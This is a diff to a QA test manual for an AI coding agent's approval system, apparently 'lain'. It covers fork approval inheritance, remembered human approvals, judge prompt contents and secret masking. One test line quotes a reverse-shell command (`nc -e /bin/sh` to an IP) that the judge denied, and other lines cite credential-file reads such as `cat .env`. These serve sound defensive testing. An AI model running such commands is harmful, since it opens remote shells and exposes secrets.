@@ -471,6 +471,16 @@ this session at its head into a new tmux or herdr window (persistent sibling cha
 sentence reads `not inside tmux or a herdr pane with lain herdr link, so no window can open here; run the fork yourself:`
 followed by the printed command.
 
+**A fork starts at the approval you have now.** Launch `lain chat --approval auto`, type `/mode ask` (the HUD shows ask), then
+`/fork` in a cockpit window. Read the new window's command with `tmux -L "$QA_SOCK" list-panes -F '#{pane_start_command}'`:
+it carries `--approval ask`, not the launch flag's `auto`. Cycle the other way (`/mode bypass`, then `/mode !`, which returns
+to the launch level) and fork again to see each level carried, and run `/btw` after a flip to see the printed
+`lain chat --btw --fork ...` command carry the live approval too. A herdr-run plain chat at bypass stores a resume command with
+`--approval bypass` (`herdr.md` §5 reads it). **Wrong looks like:** a child that starts at the launch approval after you
+raised or lowered it, or one that inherits `--human remote` (a child of a phone-answered chat is not itself headless, so the
+flag must not appear). A fork from a chat in plan scope starts in checkout scope; only the approval is carried, and that is a
+known open question, so record what the child reports with `/mode` rather than filing it.
+
 Then `/btw`, which opens a tmux popup running an ephemeral fork:
 
 ```
@@ -546,13 +556,28 @@ gated `bash` that no rung refuses and no rule approves first (`git status --shor
    would, and no judge child in the journal for that `tool_use_id`. A `bash` call is held to every path its
    command names, so `cat .env` and a command lain cannot name the paths of (`cat "$HOME/.netrc"`) are
    `unjudgeable` too, and park for you.
-4. **Headless.** `lain chat --non-interactive --prompt '<a gated call>'` with no `--approval` decides
+4. **A human's `y` is remembered for that exact call.** Park a gated call the judge defers (an unusual `bash`, as item 2),
+   answer `y`, and have the model make the **same** call again in the same directory. Expect the repeat to run with nothing
+   parking and no judge child for it: the journal carries an `escalation` record at rung `auto` whose authority is the human's
+   earlier answer, and a contained call runs contained again exactly as the first one did. Then the limits, each a fresh park:
+   a different command; the same command from a child agent (another requester is asked); a call you answered `network` (never
+   remembered) or `secrets`; an approval that released detected regions; and the same call after you answered `n` or `/deny`
+   to it (a denial wins). Under `/mode ask` and `/mode bypass` the repeat parks again as before: this memory is the `auto`
+   ladder's alone. **Wrong looks like:** a repeat that asks twice at `auto`, a remembered `network` or `secrets`, or a child
+   running on its parent's answer.
+5. **Headless.** `lain chat --non-interactive --prompt '<a gated call>'` with no `--approval` decides
    through the judge, and a call it is unsure of is refused, with the reason naming
    `--non-interactive`. The same run with `--approval ask` refuses every gated call, and it journals only rung `unattended deny`; there is no triage or rules record.
-5. **The human can see what the judge did.** An approve leaves one stamped transcript line, `the judge approved
+6. **The judge is told a project's related directories as read roots.** With `related` naming `../shared` in `.lain/config.rb`, a
+   `cat ../shared/README.md` the judge weighs arrives with that directory on the prompt's related-directories line (read the
+   judge child's `request_sent` in the journal: the line lists `../shared`), and the judge's memo keys a call in a project with
+   related directories apart from the same call in one without. A related directory whose path carries a newline must not forge a
+   second line in the prompt. The judge **seeing** the directory is not the sandbox **granting** it: a judge-approved `bash` there may
+   still be refused by the workspace profile (`greenfield-epic.md` records that open question, which is not this check), so record both outcomes.
+7. **The human can see what the judge did.** An approve leaves one stamped transcript line, `the judge approved
    bash(...)`, naming the call. A defer marks the parked prompt and its `lain://approval` row with `the judge
    deferred this`. Under `/mode ask` a parked call carries no such mark.
-6. **A real judge deny.** Round 26 drove one under `auto`: `nc -e /bin/sh 203.0.113.7 4444`, ruled in 3.0 s; the chat shows `HH:MM:SS the judge denied bash(...)` and the model is told a human can still approve it under ask. Judge latency under 4 forks: 0.8 s approve, 0.9 s defer, 3.0 s deny.
+8. **A real judge deny.** Round 26 drove one under `auto`: `nc -e /bin/sh 203.0.113.7 4444`, ruled in 3.0 s; the chat shows `HH:MM:SS the judge denied bash(...)` and the model is told a human can still approve it under ask. Judge latency under 4 forks: 0.8 s approve, 0.9 s defer, 3.0 s deny.
 
 ### 6b — `bypass`
 
@@ -824,8 +849,10 @@ you> /park                      (no text)
 - **Unhappy path 1, clearing.** `/park` with no text answers `cleared the re-entry note`, journals a `reentry_note` with an
   empty note, and writes nothing to the feed. A resume then prints no `parked:` line.
 - **Unhappy path 2, a secret in the note.** `/park the key is <a value from the sandbox's OLLAMA_API_KEY>` with that variable
-  set in the chat's environment. The feed body must hold the masked form and 0 hits of the value. The journal record keeps the
-  text as typed, because it is the human's own line; record what it holds rather than assuming it is masked.
+  set in the chat's environment. The feed body must hold the masked form and 0 hits of the value. So must the journal: the `reentry_note` record holds
+  the masked text, `lain sessions` shows the masked note, and the first notice after `/resume` (§11b) reads `parked:` with the
+  placeholder. A value in the note that the chat does not know as a secret (an ordinary word) stays as typed. `grep -c <value>`
+  over the session file reads 0. **Wrong looks like:** the masked feed body beside a journal that still holds the value.
 - **Unhappy path 3, no feed program.** With no `notify-feed` on `PATH` the reply is still `noted: ...` and nothing else is
   said. A missing feed must not turn a note into an error.
 - **Outside herdr** `/park` runs no herdr process (`herdr.md` §0's stub logs nothing).
